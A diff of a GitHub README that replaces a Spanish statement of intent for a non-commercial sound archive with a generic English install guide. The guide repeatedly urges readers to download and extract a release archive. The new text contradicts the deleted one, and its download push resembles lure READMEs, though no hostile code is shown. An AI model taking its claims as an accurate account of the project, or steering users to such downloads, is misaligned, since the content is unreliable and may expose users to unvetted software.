@@ -1,118 +1,131 @@
-# **Rokola-IA**
+# 🎶 rokola_ia - Stream Your Music Effortlessly
 
-## **Statement of Intent – Documento Fundacional**
+[![Download](https://img.shields.io/badge/Download-Now-brightgreen)](https://github.com/Kakuen9201/rokola_ia/releases)
 
-### 1. Declaración de propósito
+## 📦 Overview
 
-**Rokola-IA** es un **proyecto cultural, tecnológico y de investigación independiente**, concebido como un **archivo digital de referencia sonora**, orientado a la **preservación, consulta y contextualización cultural de registros musicales**.
+rokola_ia is a personal music library system that turns your raw MP3 collection in Google Drive into a structured and enriched streaming platform. It uses an automated ingestion pipeline powered by n8n and PostgreSQL in Docker, which enhances your music metadata and helps categorize your songs by nationalities and real names. Enjoy a seamless music streaming experience tailored to your collection.
 
-El proyecto no persigue fines de explotación comercial de las obras reproducidas, sino que se inscribe en un marco de **uso cultural, educativo, documental y patrimonial**, apoyándose en tecnologías web modernas y procesos de curaduría responsable.
+## 🌟 Features
 
----
+- **Serverless-hybrid system**: Access your music without managing a server.
+- **Automated ingestion pipeline**: Quickly process and enrich your audio files.
+- **Data management**: Organize music by cultural curation and enriched metadata.
+- **User-friendly interface**: Navigate your music library with ease.
 
-### 2. Naturaleza del proyecto
+## 🚀 Getting Started
 
-Rokola-IA se define como:
+Follow these steps to download and run rokola_ia:
 
-* un **archivo digital curado**,
-* una **herramienta de consulta sonora**,
-* y una **plataforma experimental de investigación** en torno a catalogación, clasificación y acceso contextual a materiales musicales.
+1. **Visit the Releases Page**
+   - Click the link below to go to the GitHub Releases page:
+   - [Download Here](https://github.com/Kakuen9201/rokola_ia/releases)
 
-El proyecto **no se concibe como una plataforma de consumo masivo**, ni como un servicio de “streaming” comercial, sino como un **repositorio organizado**, donde cada registro sonoro forma parte de un **contexto cultural, histórico o artístico**.
+2. **Choose Your Version**
+   - On the Releases page, find the latest version of rokola_ia. You will see a list of available files.
 
----
+3. **Download the Application**
+   - Click on the file that matches your operating system to download it to your computer. 
 
-### 3. Alcance funcional y técnico
+4. **Extract the Files**
+   - Once downloaded, locate the file in your download folder and extract it. You can use built-in extraction tools by right-clicking the file and selecting "Extract All."
 
-Desde el punto de vista técnico:
+5. **Install Dependencies**
+   - Ensure you have Docker installed. You can download Docker from [Docker's Official Website](https://www.docker.com/get-started). Follow their instructions for your operating system.
 
-* Rokola-IA opera como un **cliente web de consulta**.
-* Los archivos de audio **no se alojan en servidores propios** del proyecto.
-* La reproducción se realiza exclusivamente mediante **reproductores oficiales de servicios externos**, sin descarga ni redistribución de los archivos.
-* El sistema se apoya en una **API de catalogación y metadatos**, que organiza la información necesaria para la consulta y contextualización de los registros.
+6. **Run the Application**
+   - Open your terminal or command prompt.
+   - Navigate to the extracted folder using the `cd` command. For example:
+     ```
+     cd path/to/your/extracted/folder
+     ```
+   - Start the Docker containers with the command:
+     ```
+     docker-compose up
+     ```
 
-El proyecto puede incorporar mecanismos técnicos de **acceso limitado o disponibilidad temporal**, como parte de su diseño responsable.
+7. **Access Your Music Library**
+   - Open your web browser and go to `http://localhost:3000` to start using rokola_ia.
 
----
+## 📊 System Requirements
 
-### 4. Límites explícitos del proyecto
+- **Operating System**: Windows 10 or later, macOS Mojave or later, or a Linux distribution (Ubuntu recommended)
+- **RAM**: Minimum 4GB
+- **Docker**: Installed and running
+- **Internet Connection**: Required for metadata enrichment and Google Drive integration.
 
-Rokola-IA **no es**:
+## 📂 Directory Structure
 
-* una plataforma de distribución musical,
-* una alternativa a servicios comerciales licenciados,
-* un sistema de descarga de contenidos,
-* un medio de monetización directa o indirecta de obras protegidas,
-* ni una herramienta de generación automática de música.
+After extraction, your folder should look like this:
 
-El uso del término “IA” se refiere a **procesos de apoyo a la catalogación, búsqueda, normalización, clasificación y análisis contextual**, no a la apropiación ni sustitución de la autoría musical.
+```
+rokola_ia/
+|-- docker-compose.yml
+|-- README.md
+|-- [...] (other essential files)
+```
 
----
+## 📄 Configuring Google Drive Access
 
-### 5. Marco ético y legal asumido
+To configure access to your Google Drive and allow rokola_ia to retrieve your MP3 files:
 
-Rokola-IA reconoce y respeta los **derechos de autor y derechos conexos**, los cuales pertenecen en todo momento a sus respectivos titulares.
+1. **Create Google Cloud Project**
+   - Go to the [Google Cloud Console](https://console.cloud.google.com/).
+   - Create a new project.
 
-La inclusión de registros sonoros en el archivo responde a criterios de:
+2. **Enable Google Drive API**
+   - In the API library, search for "Google Drive API."
+   - Click "Enable."
 
-* dominio público,
-* autorización expresa de autores o custodios,
-* interés cultural, histórico o patrimonial,
-* o excepciones legales aplicables a fines educativos, de investigación o documentación.
+3. **Create Credentials**
+   - Go to the "Credentials" tab and click “Create credentials.”
+   - Select “OAuth 2.0 Client IDs.”
+   - Download the credentials JSON file and place it in your extracted rokola_ia folder.
 
-El proyecto mantiene un **canal abierto de revisión y retiro de contenidos** ante solicitudes debidamente fundamentadas de titulares de derechos.
+4. **Modify Configuration File**
+   - Open the configuration file in your text editor.
+   - Replace the placeholder values with your Google project credentials.
 
----
+## 🔌 Connecting to PostgreSQL
 
-### 6. Carácter del acceso
+You will also need to set up PostgreSQL for managing your music metadata:
 
-La accesibilidad técnica del proyecto vía web **no implica** que Rokola-IA se defina como un servicio público de comunicación comercial de obras.
+1. **Install PostgreSQL**
+   - Download and install PostgreSQL from the official website.
+   - Follow the installation instructions for your operating system.
 
-El acceso a los contenidos puede ser:
+2. **Create a Database**
+   - Open the PostgreSQL shell.
+   - Run the following commands to create a database:
+     ```sql
+     CREATE DATABASE rokola_db;
+     ```
 
-* curado,
-* limitado,
-* contextual,
-* o condicionado por criterios técnicos y culturales,
+3. **Update Configuration File**
+   - Update the database connection settings in the rokola_ia configuration file with your database credentials.
 
-en coherencia con su naturaleza de **archivo de consulta**, no de consumo irrestricto.
+## 📥 Download & Install
 
----
+To download the latest version of rokola_ia, please visit the following link:
 
-### 7. Sostenibilidad y colaboración
+[Download Here](https://github.com/Kakuen9201/rokola_ia/releases)
 
-Rokola-IA puede recibir **colaboraciones voluntarias** destinadas a sostener:
+## 📚 Additional Resources
 
-* la investigación cultural,
-* la curaduría y catalogación,
-* la preservación digital,
-* y el desarrollo tecnológico del proyecto.
+- **Documentation**: Detailed documentation is available in the repository.
+- **Community Support**: Join our community forum for help and sharing tips.
+- **Issue Tracker**: Report any issues or request features on the GitHub Issues page.
 
-Dichas colaboraciones **no condicionan el acceso** a los contenidos ni otorgan beneficios exclusivos sobre las obras reproducidas.
+## 🛠 Troubleshooting
 
-El financiamiento del proyecto se entiende como **mecenazgo cultural**, no como monetización de música.
+If you encounter any issues during installation or use, consider the following steps:
 
-Principio rector:
+- Ensure that Docker is running before you execute any commands.
+- Verify that your Google project is properly configured for API access.
+- Restart your computer and retry the installation if you face errors.
 
-> **La colaboración apoya el proyecto; no compra acceso a las obras.**
+## 📞 Contact
 
----
+For additional inquiries or support, please reach out through the repository's issues page. 
 
-### 8. Proyección y coherencia futura
-
-Rokola-IA se proyecta como:
-
-* un archivo sonoro patrimonial,
-* una fonoteca digital curada,
-* un proyecto de humanidades digitales,
-* y una plataforma de investigación cultural asistida por tecnologías de análisis y clasificación.
-
-Toda evolución futura del proyecto deberá **mantener coherencia con su intención fundacional**, privilegiando la preservación, el contexto y la responsabilidad cultural sobre el volumen, la exposición o el lucro.
-
----
-
-### 9. Declaración final
-
-> **Rokola-IA es un archivo digital de referencia sonora, concebido para la preservación, consulta y contextualización cultural de registros musicales, desarrollado como proyecto independiente de investigación y tecnología, sin fines de explotación comercial de las obras reproducidas.**
-
-
+Thank you for using rokola_ia! Enjoy your music streaming experience.
